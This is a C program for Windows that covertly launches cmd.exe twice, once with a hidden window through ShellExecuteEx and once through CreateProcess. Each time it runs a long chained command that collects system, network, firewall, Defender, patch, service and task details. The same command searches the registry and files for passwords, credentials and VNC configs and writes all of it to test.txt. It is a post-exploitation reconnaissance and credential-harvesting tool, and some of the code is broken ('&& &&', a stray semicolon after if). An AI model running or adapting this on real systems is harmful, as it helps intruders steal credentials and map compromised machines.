#include <windows.h>
#include <stdio.h>
#include <shellapi.h>
#pragma comment(lib, "shell32.lib")

int main()
{
    //Using ShellExecuteEX

    SHELLEXECUTEINFO sei;

    SecureZeroMemory(&sei, sizeof(SHELLEXECUTEINFO));

    sei.cbSize = sizeof(SHELLEXECUTEINFO);
    sei.lpVerb = "open";
    sei.lpFile = "cmd";
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpParameters = "/k ipconfig /allcompartments /all > test.txt && net user >> test.txt && whoami >> test.txt && hostname >> test.txt && wmic nicconfig get description,IPAddress,MACaddress >> test.txt && route PRINT >> test.txt && arp -a >> test.txt && netstat -ano >> test.txt && netsh advfirewall showcurrentprofile >> test.txt && netsh advfirewall firewall show rule name=all >> test.txt && netsh firewall show state >> test.txt && netsh firewall show config >> test.txt && sc query windefend >> test.txt && tasklist /SVC >> test.txt && set userdomain >> test.txt && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" >> test.txt && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v LastUsedUsername >> test.txt && reg query HKLM /f password /t REG_SZ /s >> test.txt && reg query HKCU /f password /t REG_SZ /s >> test.txt && wmic qfe >> test.txt && wmic product get name, version, vendor >> test.txt && wmic qfe get Caption, Description, HotFixID, InstalledOn >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" |findstr /i /v \"\"\" >> test.txt && net start >> test.txt && Driverquery >> test.txt && Schtasks /query /fo LIST /v >> test.txt && findstr /si password *.txt >> test.txt && && findstr /si password *.xml >> test.txt && && findstr /si password *.ini >> test.txt && dir /s *pass* == *cred* == *vnc* == *.config* >> test.txt && exit";
    sei.nShow = SW_HIDE;

    ShellExecuteEx( &sei );

    WaitForSingleObject(sei.hProcess, INFINITE);

    printf("Process with ID:%i has exited.\n", GetProcessId(sei.hProcess));

    // Using CreateProcess

    STARTUPINFO si;
    SecureZeroMemory(&si, sizeof(STARTUPINFO));

    si.cb = sizeof(STARTUPINFO);

    PROCESS_INFORMATION pi;

    BOOL result = CreateProcess(
                        "c:\\windows\\system32\\cmd.exe",
                        "/k ipconfig /allcompartments /all > test.txt && net user >> test.txt && whoami >> test.txt && hostname >> test.txt && wmic nicconfig get description,IPAddress,MACaddress >> test.txt && route PRINT >> test.txt && arp -a >> test.txt && netstat -ano >> test.txt && netsh advfirewall showcurrentprofile >> test.txt && netsh advfirewall firewall show rule name=all >> test.txt && netsh firewall show state >> test.txt && netsh firewall show config >> test.txt && sc query windefend >> test.txt && tasklist /SVC >> test.txt && set userdomain >> test.txt && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" >> test.txt && reg query \"HKLM\\Software\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v LastUsedUsername >> test.txt && reg query HKLM /f password /t REG_SZ /s >> test.txt && reg query HKCU /f password /t REG_SZ /s >> test.txt && wmic qfe >> test.txt && wmic product get name, version, vendor >> test.txt && wmic qfe get Caption, Description, HotFixID, InstalledOn >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" >> test.txt && wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\" |findstr /i /v \"\"\" >> test.txt && net start >> test.txt && Driverquery >> test.txt && Schtasks /query /fo LIST /v >> test.txt && findstr /si password *.txt >> test.txt && && findstr /si password *.xml >> test.txt && && findstr /si password *.ini >> test.txt && dir /s *pass* == *cred* == *vnc* == *.config* >> test.txt && exit",
                        NULL,
                        NULL,
                        FALSE,
                        0,
                        NULL,
                        NULL,
                        &si,
                        &pi);

    if(result);
    {
        WaitForSingleObject(pi.hProcess, INFINITE);
        printf("Process with ID: %i has exited.\n", GetProcessId(pi.hProcess));
        CloseHandle(pi.hProcess);
    }

    return 0;
}